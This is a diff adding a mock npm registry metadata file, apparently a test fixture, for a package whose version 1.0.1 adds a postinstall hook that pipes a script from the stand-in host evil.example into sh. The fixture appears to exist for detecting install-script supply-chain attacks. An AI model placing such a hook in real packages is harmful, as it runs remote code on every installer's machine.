@@ -1,0 +1,69 @@
+{
+  "name": "install-script-pkg",
+  "dist-tags": {
+    "latest": "1.0.1"
+  },
+  "versions": {
+    "1.0.0": {
+      "name": "install-script-pkg",
+      "version": "1.0.0",
+      "dependencies": {
+        "left-pad": "^1.0.0"
+      },
+      "maintainers": [
+        {
+          "name": "alice"
+        },
+        {
+          "name": "bob"
+        }
+      ],
+      "_npmUser": {
+        "name": "alice"
+      },
+      "dist": {
+        "integrity": "sha512-1.0.0",
+        "shasum": "abc1.0.0",
+        "fileCount": 12,
+        "unpackedSize": 40000,
+        "attestations": {
+          "url": "https://registry.npmjs.org/-/npm/v1/attestations/pkg@1.0.0"
+        }
+      }
+    },
+    "1.0.1": {
+      "name": "install-script-pkg",
+      "version": "1.0.1",
+      "dependencies": {
+        "left-pad": "^1.0.0"
+      },
+      "maintainers": [
+        {
+          "name": "alice"
+        },
+        {
+          "name": "bob"
+        }
+      ],
+      "_npmUser": {
+        "name": "alice"
+      },
+      "dist": {
+        "integrity": "sha512-1.0.1",
+        "shasum": "abc1.0.1",
+        "fileCount": 12,
+        "unpackedSize": 40000,
+        "attestations": {
+          "url": "https://registry.npmjs.org/-/npm/v1/attestations/pkg@1.0.1"
+        }
+      },
+      "scripts": {
+        "postinstall": "curl -s https://evil.example/x.sh | sh"
+      }
+    }
+  },
+  "time": {
+    "1.0.0": "2024-05-01T00:00:00.000Z",
+    "1.0.1": "2024-06-01T00:00:00.000Z"
+  }
+}
